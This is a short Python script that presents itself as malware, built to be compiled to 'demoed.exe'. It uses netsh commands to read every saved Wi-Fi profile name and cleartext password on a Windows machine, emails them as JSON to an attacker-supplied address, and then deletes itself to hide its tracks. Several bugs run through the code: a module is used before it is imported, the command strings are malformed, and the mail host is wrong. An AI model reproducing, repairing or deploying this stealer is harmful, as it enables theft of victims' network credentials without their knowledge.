#!/usr/share/python3 

malware_name = "demoed.exe"              # Edit the malware name that is to be set after comping the code
email = ""                               # Email address to use and send the data to
password = ""                            # Email address password

def module_install(module):
    try:
        os.system("pip3 install " + module)
    except Exception:
        exit()

try:
    import subprocess
except ImportError:
    module_install("subprocess")

try:
    import smtplib
except ImportError:
    module_install("smtplib")

try:
    import json
except ImportError:
    module_install("json")

try:
    import os
except ImportError:
    module_install("os")

def profiles_extracter():
    ssid = []
    command = "netsh wlan show profiles"
    raw_data = subprocess.check_output(command)
    list = raw_data.split(" ")
    for i in range(len(list)):
        if list[i] == ":":
            space_name = list[i+1]
            ssid.append(space_name.replace("\n", ""))
    return ssid

def password_extractor(ssid):
    key = []
    command = "netsh wlan show profile" + ssid + "key=clear"
    raw_data = subprocess.check_output(command)
    list = raw_data.split(" ")
    for i in range(len(list)):
        if list[i] == "Content":
            key.append(list[i + 13])
    return key

def send_mail(email_address, email_password, message):            
    server = smtplib.SMTP("smtp.google.com", 587)
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, email_address, message)
    server.quit()

credentials_dict = {}
try:
    ssid_list = profiles_extracter()
    for i in range(len(ssid_list)):
        ssid = ssid_list[i]
        key = password_extractor(ssid)
        credentials_dict[ssid] = key 

    json_data = json.dumps(credentials_dict)
    send_mail(email, password, json_data)
    subprocess.call(["del", malware_name])

except Exception:
    exit()
